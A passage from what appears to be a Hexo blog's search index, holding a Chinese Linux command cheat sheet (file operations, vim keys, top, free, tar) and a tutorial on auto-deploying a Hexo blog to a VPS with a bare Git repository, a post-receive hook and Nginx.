class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">cd</span> ../  <span class="comment">#进入上层目录</span></span><br><span class="line">$ <span class="built_in">cd</span> ../../  <span class="comment">#进入上上层目录</span></span><br><span class="line">$ <span class="built_in">cd</span> ~ <span class="comment">#进入当前用户的家目录</span></span><br><span class="line">$ <span class="built_in">cd</span> /root/lnmp/conf <span class="comment">#进入/root/lnmp/conf目录</span></span><br></pre></td></tr></table></figure><p><strong>mkdir</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ mkdir linuxeye <span class="comment">#创建一个linuxeye目录</span></span><br><span class="line">$ mkdir -p backup/sql  <span class="comment">#递归创建目录（如果目录不存在，则创建）</span></span><br></pre></td></tr></table></figure><p><strong>rm</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ rm init.sh <span class="comment">#删除init.sh文件（不加-r参数不能删除目录）</span></span><br><span class="line">$ rm -r conf <span class="comment">#递归删除文件或目录（可以删除文件夹，系统会询问你是否删除，输入y表示确认，然后回车即可）</span></span><br><span class="line">$ rm -rf backup <span class="comment">#不会询问（-f参数慎用），直接递归删除文件或目录</span></span><br></pre></td></tr></table></figure><p><strong>mv</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ mv linux linuxeye <span class="comment">#将linux文件或者目录重命名为linuxeye</span></span><br><span class="line">$ mv vhost.sh conf/  <span class="comment">#将vhost.sh移动到conf目录下</span></span><br></pre></td></tr></table></figure><p><strong>cp</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ cp linux linuxeye <span class="comment">#将linux文件复制一份命名为linuxeye（如果存在linuxeye目录，则将linux文件复制到linuxeye目录下，文件名不变为linux）</span></span><br><span class="line">$ cp -r linuxeye/ conf/ <span class="comment">#将linuxeye目录（包含里面文件）复制到conf目录下</span></span><br></pre></td></tr></table></figure><p><strong>wget</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ wget //linuxeye.com/wp-content/uploads/lnmp.tar.gz <span class="comment">#下载文件，可加参数-c断点续传；-T 设置超时时间后面跟秒</span></span><br></pre></td></tr></table></figure><p><strong>cat &amp;&amp; grep</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ cat vhost.sh | grep linuxeye <span class="comment">#显示vhost.sh 过滤包含linuxeye字符的行</span></span><br></pre></td></tr></table></figure><p><strong>vi,vim</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line">   一般模式                 删除、复制与粘贴</span><br><span class="line">x,X                      x为向后删除一个字符，X为先前删除一个字符</span><br><span class="line">nx(n代表数字)             向后删除n个字符</span><br><span class="line">dd                       删除当前行</span><br><span class="line">D                        删除当前行所有字符，试成为空行</span><br><span class="line">ndd(n代表数字)            删除光标所在行的向下n列</span><br><span class="line">d1G                      删除光标所在行到第一行的所有数据</span><br><span class="line">dG                       删除光标所在行到最后一行的所有数据</span><br><span class="line">yy                       复制光标所在行</span><br><span class="line">y1G                      复制光标所在行到第一行的所有数据</span><br><span class="line">yG                       复制光标所在行到最后一行的所有数据</span><br><span class="line">ynj(n代表数字)            复制光标所在行向下n+1行</span><br><span class="line">dnj(n代表数字)            删除光标所在行向下n+1行</span><br><span class="line">p,P                      p为复制的数据粘贴在光标的下一行，P为复制的数据粘贴在光标的上一行</span><br><span class="line">J                        将光标所在行与下一行的数据结合成一行</span><br><span class="line">u                        恢复前一个动作(undo)</span><br><span class="line"> </span><br><span class="line">   编辑模式</span><br><span class="line">i,I                      i为在当前光标所在处插入输入的文字，I为在光标所在行第一个非空字符插入输入的文字</span><br><span class="line">a,A                      a为在当前光标所在处下一个字符插入输入的文字，A为在光标所在行最后一个字符的下一个字符处插入输入的文字</span><br><span class="line">o,O                      o为在光标所在行的下一行行首开始插入字符，O为在光标所在行的上一行行首开始插入字符</span><br><span class="line">r,R                      r为替换光标所在那一个字符，R为一直替换光标所指的文字，直到退出</span><br><span class="line">Esc                      退出，回到一般模式</span><br><span class="line"> </span><br><span class="line">   命令模式                 光标移动</span><br><span class="line">h                        光标向左移一个字符</span><br><span class="line">j                        光标向下移一个字符</span><br><span class="line">k                        光标向上移一个字符</span><br><span class="line">l                        光标向右移一个字符</span><br><span class="line">Ctrl+f                   屏幕向下翻一页</span><br><span class="line">Ctrl+b                   屏幕向上翻一页</span><br><span class="line">Ctrl+d                   屏幕向下翻半页</span><br><span class="line">Ctrl+u                   屏幕向上翻半页</span><br><span class="line">+                        光标移动到下一行的第一个非空字符</span><br><span class="line">-                        光标移动到当前行的第一个非空字符</span><br><span class="line">n空格(n代表数字)           光标向当前行向右移动n个字符</span><br><span class="line">0(数字0)                  光标移动到当前行的第一个字符(可以为空字符,注意与-区分）</span><br><span class="line">$                        光标移动到当前行的最后一个字符(可以为空字符,注意与-区分）</span><br><span class="line">H                        光标移动到当前屏幕最上方的那一行的第一个非空字符</span><br><span class="line">M                        光标移动到当前屏幕最中间那一行的第一个非空字符</span><br><span class="line">L                        光标移动到当前屏幕最下方的那一行的第一个非空字符</span><br><span class="line">G                        光标移动到该文章最后一行的第一个非空字符</span><br><span class="line">nG(n代表数字)             光标移动到该文章第n行的第一个非空字符</span><br><span class="line">n&lt;Enter&gt;                 光标从当前行向下移动n行的第一个非空字符</span><br><span class="line">/word                    在光标之后查找word字符串</span><br><span class="line">?word                    在光标之前查找word字符串</span><br><span class="line">:s/word1/word2/g         在光标当前行查找word1，并替换成word2</span><br><span class="line">:n1,n2s/word1/word2/g    在第n1行与第n2行之间查找word1，并替换成word2</span><br><span class="line">:%s/word1/word2/g        整个文章查找word1，并替换成word2</span><br><span class="line">:w                       将编辑的数据保存到硬盘文件中</span><br><span class="line">:w [filename]            将编辑后的数据保存到硬盘的另一个文件中</span><br><span class="line">:r [filename]            在编辑数据时，读入另一个文件中的数据，即将filename文件中的内容加到光标所在行下一行</span><br><span class="line">:wq或:x                  保存并退出</span><br><span class="line">:q                       退出，适用于未修改的文件</span><br><span class="line">:q!                      强制退出，适用于修改文件后不保存退出</span><br><span class="line">:<span class="built_in">set</span> nu                  显示行号</span><br><span class="line">:<span class="built_in">set</span> nonu                取消行号</span><br><span class="line">:n1,n2 w [filename]      将n1到n2行的内容保存到名为filename的文件中</span><br></pre></td></tr></table></figure><p><strong>awk</strong></p><p>取一个公网ip地址：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ifconfig | grep <span class="string">'inet addr:'</span> | cut -d: -f2 | grep -v ^10\. | grep -v ^192\.168 | grep -v ^172\. | grep -v ^127\. | awk <span class="string">'&#123;print  $1&#125;'</span> | awk <span class="string">'&#123;print;exit&#125;'</span></span><br></pre></td></tr></table></figure><h3 id="系统资源管理"><a href="#系统资源管理" class="headerlink" title="系统资源管理"></a>系统资源管理</h3><p><strong>df -h</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Filesystem            Size  Used Avail Use% Mounted on</span><br><span class="line">/dev/xvda              24G   13G  9.9G  55% /</span><br><span class="line">tmpfs                 501M  108K  501M   1% /dev/shm</span><br></pre></td></tr></table></figure><p><strong>top</strong> </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#动态查看进程消耗资源（cpu、内存）</span></span><br><span class="line"></span><br><span class="line">任务: 379 total,   1 running, 308 sleeping,   0 stopped,   1 zombie</span><br><span class="line">%Cpu(s):  3.8 us,  2.4 sy,  0.0 ni, 93.6 id,  0.1 wa,  0.0 hi,  0.1 si,  0.0 st</span><br><span class="line">KiB Mem : 16280288 total,  1058132 free,  8582032 used,  6640124 buff/cache</span><br><span class="line">KiB Swap:  2097148 total,  2097148 free,        0 used.  5876956 avail Mem </span><br><span class="line"></span><br><span class="line">进程  USER      PR  NI    VIRT    RES    SHR �  %CPU %MEM     TIME+ COMMAND     </span><br><span class="line"> 5243 lilijie   20   0 2165060 336400  60552 S  17.4  2.1 184:48.45 TIM.exe     </span><br><span class="line"> 3852 lilijie   20   0 4772836 682132 126760 S  12.8  4.2  73:35.98 gnome-shell </span><br><span class="line"> 4948 lilijie   20   0    9932   7044   1888 S  10.5  0.0 114:50.37 wineserver+ </span><br><span class="line"> 4965 lilijie   20   0 5571964 239932 157272 S   9.2  1.5  40:01.86 netease-cl+ </span><br><span class="line"> 3350 lilijie   20   0  549928  94708  63820 S   2.6  0.6  40:03.74 Xorg        </span><br><span class="line">18145 lilijie   20   0  678364  50532  36728 S   2.6  0.3   0:15.33 gnome-term+ </span><br><span class="line"> 4780 lilijie   20   0 6952916 1.705g  47972 S   1.6 11.0  51:50.85 java        </span><br><span class="line">  895 root      20   0  504548  12920   8676 S   1.0  0.1   8:33.99 udisksd     </span><br><span class="line"> 8586 lilijie   20   0 5800340 388376  65228 S   1.0  2.4  40:28.56 java        </span><br><span class="line">32539 lilijie   20   0   51492   4276   3456 R   1.0  0.0   0:00.39 top         </span><br><span class="line">  914 root      20   0    4552    792    732 S   0.7  0.0   1:08.66 acpid       </span><br><span class="line">23293 root      20   0  779568  11432   7480 S   0.7  0.1   3:51.96 micron-age+ </span><br><span class="line">32138 lilijie   20   0 1579276 161104  97856 S   0.7  1.0   0:28.27 Typora      </span><br><span class="line">  945 message+  20   0   51804   6436   4012 S   0.3  0.0   1:45.40 dbus-daemon </span><br><span class="line"> 3922 10000     20   0   86752  30892   1700 S   0.3  0.2   0:15.20 nginx       </span><br><span class="line"> 3923 10000     20   0   87580  33424   3380 S   0.3  0.2   0:15.12 nginx       </span><br><span class="line"> 4292 lilijie   20   0 5709832 1.507g 165024 S   0.3  9.7  17:35.18 chromium-b+</span><br></pre></td></tr></table></figure><p><strong>top -H</strong> </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#查看各个线程资源消耗情况</span></span><br><span class="line"></span><br><span class="line">top - 14:40:36 up 23:43,  1 user,  load average: 0.91, 1.37, 1.81</span><br><span class="line">Threads: 1520 total,   1 running, 1448 sleeping,   0 stopped,   1 zombie</span><br><span class="line">%Cpu(s):  4.9 us,  2.6 sy,  0.0 ni, 92.2 id,  0.3 wa,  0.0 hi,  0.1 si,  0.0 st</span><br><span class="line">KiB Mem : 16280288 total,  1032576 free,  8586996 used,  6660716 buff/cache</span><br><span class="line">KiB Swap:  2097148 total,  2097148 free,        0 used.  5856040 avail Mem </span><br><span class="line"></span><br><span class="line">进程  USER      PR  NI    VIRT    RES    SHR � %CPU %MEM     TIME+ COMMAND      </span><br><span class="line">32703 lilijie   20   0   52836   5416   3360 R 25.0  0.0   0:00.14 top          </span><br><span class="line"> 4948 lilijie   20   0    9932   7044   1888 S  8.3  0.0 114:57.05 wineserver.+ </span><br><span class="line"> 4965 lilijie   20   0 5571964 239932 157272 S  8.3  1.5  36:51.21 netease-clo+ </span><br><span class="line"> 3928 10000     20   0   87336  33112   3320 S  4.2  0.2   0:14.72 nginx        </span><br><span class="line"> 5031 lilijie   20   0 2695880  32744  22520 S  4.2  0.2   2:33.87 QQProtect.e+ </span><br><span class="line"> 5243 lilijie   20   0 2165060 336472  60552 S  4.2  2.1  87:29.94 TIM.exe      </span><br><span class="line"> 5287 lilijie   20   0 2165060 336472  60552 S  4.2  2.1   3:56.11 TIM.exe      </span><br><span class="line">32261 lilijie   20   0 2165060 336472  60552 S  4.2  2.1  54:08.17 TIM.exe      </span><br><span class="line">    1 root      20   0  373304   9708   6748 S  0.0  0.1   1:14.52 systemd      </span><br><span class="line">    2 root      20   0       0      0      0 S  0.0  0.0   0:00.07 kthreadd     </span><br><span class="line">    4 root       0 -20       0      0      0 I  0.0  0.0   0:00.00 kworker/0:0H </span><br><span class="line">    6 root       0 -20       0      0      0 I  0.0  0.0   0:00.00 mm_percpu_wq </span><br><span class="line">    7 root      20   0       0      0      0 S  0.0  0.0   0:00.91 ksoftirqd/0  </span><br><span class="line">    8 root      20   0       0      0      0 I  0.0  0.0   1:19.64 rcu_sched    </span><br><span class="line">    9 root      20   0       0      0      0 I  0.0  0.0   0:00.00 rcu_bh       </span><br><span class="line">   10 root      rt   0       0      0      0 S  0.0  0.0   0:00.03 migration/0  </span><br><span class="line">   11 root      rt   0       0      0      0 S  0.0  0.0   0:00.15 watchdog/0</span><br></pre></td></tr></table></figure><p><strong>free -m</strong> # 查看内存、swap使用情况，top也可以看</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">              总计         已用        空闲      共享    缓冲/缓存    可用</span><br><span class="line">内存：       15898        8395         997        1702        6505        5708</span><br><span class="line">交换：        2047           0        2047</span><br></pre></td></tr></table></figure><h3 id="压缩与解压缩"><a href="#压缩与解压缩" class="headerlink" title="压缩与解压缩"></a>压缩与解压缩</h3><p><strong>tar</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ tar czf linuxeye.tar.gz ./linuxeye <span class="comment">#tar打包压缩</span></span><br><span class="line">$ tar xzf linuxeye.tar.gz  <span class="comment">#解压</span></span><br></pre></td></tr></table></figure><p><strong>zip &amp; unzip</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ zip -r linuxeye.zip ./linuxeye <span class="comment">#zip压缩</span></span><br><span class="line">$ unzip -q linuxeye.zip <span class="comment">#安静的zip解压（加-q参数不会显示压缩过程）</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 计算机操作系统 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 操作系统 </tag>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hexo自动部署</title>
      <link href="/2018/07/03/2018-07-03-Hexo%E8%87%AA%E5%8A%A8%E9%83%A8%E7%BD%B2/"/>
      <url>/2018/07/03/2018-07-03-Hexo%E8%87%AA%E5%8A%A8%E9%83%A8%E7%BD%B2/</url>
      
        <content type="html"><![CDATA[<p><i class="fa fa-quote-left"></i> 生命，在于不停的折腾 <i class="fa fa-quote-right"></i></p><a id="more"></a><h1 id="开篇废话"><a href="#开篇废话" class="headerlink" title="开篇废话"></a>开篇废话</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>一直想重构自己大一写的博客，恰巧这段时间看到了实验室挺多小伙伴都在用 <em>Hexo</em> 搭建自己的博客，一方面懒得再去看之前的代码了，一方面 <em>Hexo</em> 确实有很多不错的主题…</p><p>于是乎，就这么开始了 <em>Hexo</em> 的搭建之旅。</p><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>一开始的想法是直接在 <em>VPS</em> 上搭 <em>Hexo</em> 环境，由 <em>Hexo</em> 服务解析成静态页,然后通过 <em>Hexo Server</em> 对外服务。这样的确搭建起来十分快速，可是需要本地编写 <em>MarkDown</em> 文档并手动传至服务器，显得很傻。</p><p>那么，换个思路——在本地搭 <em>Hexo</em> 环境，解析成静态页后提交到服务器,通过 <em>Git Hooks</em> 自动更新站点目录文件，然后由 <em>VPS</em> 的 <em>Nginx</em> 对外服务，这样 <em>VPS</em> 上只需有 <em>Git</em> 和 <em>Nginx</em> 的环境即可。</p><h1 id="搭建过程"><a href="#搭建过程" class="headerlink" title="搭建过程"></a>搭建过程</h1><h2 id="搭建Git服务器-CentOs7"><a href="#搭建Git服务器-CentOs7" class="headerlink" title="搭建Git服务器 (CentOs7)"></a>搭建Git服务器 (CentOs7)</h2><h3 id="第一步"><a href="#第一步" class="headerlink" title="第一步"></a>第一步</h3><p>安装 <em>Git</em> ， <em>yum</em> 源的 <em>git</em> 版本不太新，我是编译安装的。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ yum -y install git</span><br></pre></td></tr></table></figure><p>以下是编译安装过程</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">//下载编译工具</span><br><span class="line">$ yum -y groupinstall <span class="string">"Development Tools"</span></span><br><span class="line"></span><br><span class="line">//下载依赖包</span><br><span class="line">$ yum -y install zlib-devel perl-ExtUtils-MakeMaker asciidoc xmlto openssl-devel</span><br><span class="line"></span><br><span class="line">//下载 Git 最新版本的源代码</span><br><span class="line">$ wget https://www.kernel.org/pub/software/scm/git/git-2.18.0.tar.gz </span><br><span class="line"></span><br><span class="line">//解压</span><br><span class="line">$ tar -zxvf git-2.11.0.tar.gz</span><br><span class="line"></span><br><span class="line">//编译安装</span><br><span class="line">$ <span class="built_in">cd</span> git-2.13.3 </span><br><span class="line">$ ./configure --prefix=/usr/<span class="built_in">local</span>/git</span><br><span class="line">$ make &amp;&amp; make install</span><br><span class="line"></span><br><span class="line">//配置全局路径</span><br><span class="line">$ <span class="built_in">export</span> PATH=<span class="string">"/usr/local/git/bin:<span class="variable">$PATH</span>"</span> </span><br><span class="line">$ <span class="built_in">source</span> /etc/profile</span><br></pre></td></tr></table></figure><h3 id="第二步"><a href="#第二步" class="headerlink" title="第二步"></a>第二步</h3><p>创建 <em>git</em> 用户,用来运行 <em>git</em> 服务。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo adduser git</span><br></pre></td></tr></table></figure><h3 id="第三步"><a href="#第三步" class="headerlink" title="第三步"></a>第三步</h3><p>创建证书登录，刚创建的git用户它是它是没有 <em>~/.ssh/</em> 和 <em>~/.ssh/authorized_keys</em> 文件的 ，因此这里需要手动创建，这里为了避免权限的问题 ，这里的文件创建全部使用 <em>git</em> 用户处理。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">//切换用户</span><br><span class="line">$ su - git</span><br><span class="line"></span><br><span class="line">$ mkdir .ssh</span><br><span class="line">$ chmod 700 .ssh</span><br><span class="line">$ touch ~/.ssh/authorized_keys </span><br><span class="line">$ chmod 644 ~/.ssh/authorized_keys</span><br></pre></td></tr></table></figure><p>若本地没有 <em>SSH</em> 公钥可以用 <em>ssh-keygen</em> 指令生成公钥。这里也不多说了。</p><p>要注意的是，公钥复制到 <em>~/.ssh/authorized_keys</em> 时，不能直接粘贴复制，要用 <em>cat</em> 指令。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ cat [公钥] &gt; ~/.ssh/authorized_keys</span><br></pre></td></tr></table></figure><h3 id="第四步"><a href="#第四步" class="headerlink" title="第四步"></a>第四步</h3><p>初始化 <em>git</em> 仓库，先选定一个目录作为 <em>Git</em> 仓库。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ mkdir blog.git</span><br><span class="line">$ git init --bare blog.git</span><br></pre></td></tr></table></figure><p><em>Git</em> 就会创建一个裸仓库，裸仓库没有工作区，因为服务器上的 <em>Git</em> 仓库纯粹是为了共享，所以不让用户直接登录到服务器上去改工作区，并且服务器上的 <em>Git</em> 仓库通常都以 <em>.git</em> 结尾。然后，把 <em>owner</em> 改为 <em>git</em> .</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo chown -R git:git sample.git</span><br></pre></td></tr></table></figure><h3 id="第五步"><a href="#第五步" class="headerlink" title="第五步"></a>第五步</h3><p>禁用 <em>shell</em> 登录，出于安全考虑，第二步创建的 <em>git</em> 用户不允许登录 <em>shell</em> ，这可以通过编辑 <em>/etc/passwd</em> 文件完成。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git:x:1001:1001:,,,:/home/git:/bin/bash</span><br></pre></td></tr></table></figure><p>改为:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git:x:1001:1001:,,,:/home/git:/usr/bin/git-shell</span><br></pre></td></tr></table></figure><p>这样， <em>git</em> 用户可以正常通过 <em>ssh</em> 使用 <em>git</em> ，但无法登录 <em>shell</em> ，因为我们为 <em>git</em> 用户指定的 <em>git-shell</em> 每次一登录就自动退出。<br>到这一步， <em>git</em> 服务器就搭建完成了。</p><h2 id="配置Git-Hooks"><a href="#配置Git-Hooks" class="headerlink" title="配置Git Hooks"></a>配置Git Hooks</h2><p>这个 <em>Git Hooks</em> 的作用就是当仓库收到 <em>git push</em> 后，能触发一段 <em>shell</em> 脚本。脚本将静态文件复制到网站目录，通过 <em>nginx</em> 服务器就可以正常访问博客了。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ su - git</span><br><span class="line">$ <span class="built_in">cd</span> ～/blog.git/hooks</span><br><span class="line">$ touch post-receive    <span class="comment"># 新建脚本文件</span></span><br><span class="line">$ vim post-receive</span><br></pre></td></tr></table></figure><p>输入以下代码后保存退出</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line">GIT_REPO=/home/git/blog.git    <span class="comment"># git仓库</span></span><br><span class="line">TMP_GIT_CLONE=/tmp/hexo    <span class="comment"># 临时目录</span></span><br><span class="line">PUBLIC_WWW=/var/www/blog    <span class="comment"># 网站目录</span></span><br><span class="line">rm -rf <span class="variable">$&#123;TMP_GIT_CLONE&#125;</span></span><br><span class="line">git <span class="built_in">clone</span> <span class="variable">$GIT_REPO</span> <span class="variable">$TMP_GIT_CLONE</span></span><br><span class="line">rm -rf <span class="variable">$&#123;PUBLIC_WWW&#125;</span>/*</span><br><span class="line">cp -rf <span class="variable">$&#123;TMP_GIT_CLONE&#125;</span>/* <span class="variable">$&#123;PUBLIC_WWW&#125;</span></span><br></pre></td></tr></table></figure><p>赋予脚本执行权</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chmod +x post-receive</span><br></pre></td></tr></table></figure><h2 id="本地配置"><a href="#本地配置" class="headerlink" title="本地配置"></a>本地配置</h2><h3 id="hexo"><a href="#hexo" class="headerlink" title="hexo"></a>hexo</h3><p>首先肯定得安装 <em>Hexo</em> 及相关环境，在这里就不多说了，请看官方文档：<a href="http://example.com/" target="_blank" rel="noopener">Hexo</a>。</p><h3 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h3><p>修改 <em>Hexo</em> 的配置文件 <em>_config.yml</em></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">deploy:</span><br><span class="line">  <span class="built_in">type</span>: git</span><br><span class="line">  repo:</span><br><span class="line">    <span class="comment">#同步到GitHub</span></span><br><span class="line">    github:  https://github.com/GitHubusername/example.github.io.git</span><br><span class="line">    <span class="comment">#同步到自己的VPS</span></span><br><span class="line">    vps:  ssh://git@example.com:22/home/git/blog.git</span><br><span class="line">  branch: master</span><br><span class="line">  message: Hexo Blog updated - &#123;&#123; now(<span class="string">'YYYY-MM-DD HH:mm:ss'</span>) &#125;&#125;</span><br><span class="line">``` </span><br><span class="line"></span><br><span class="line"><span class="comment">### 自动部署</span></span><br><span class="line"></span><br><span class="line">接下来的事情就很简单了，在本地写好博客，然后输入以下两条指令。</span><br><span class="line"></span><br><span class="line">``` bash</span><br><span class="line">$ hexo g  //编译成静态文件</span><br><span class="line">$ hexo d  //提交到git服务器</span><br></pre></td></tr></table></figure><p>全文到这里就完成了 <em>Hexo</em> 博客的自动部署，希望对你有帮助。</p>]]></content>
      
      
      <categories>
          
          <category> 其他 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 其他 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
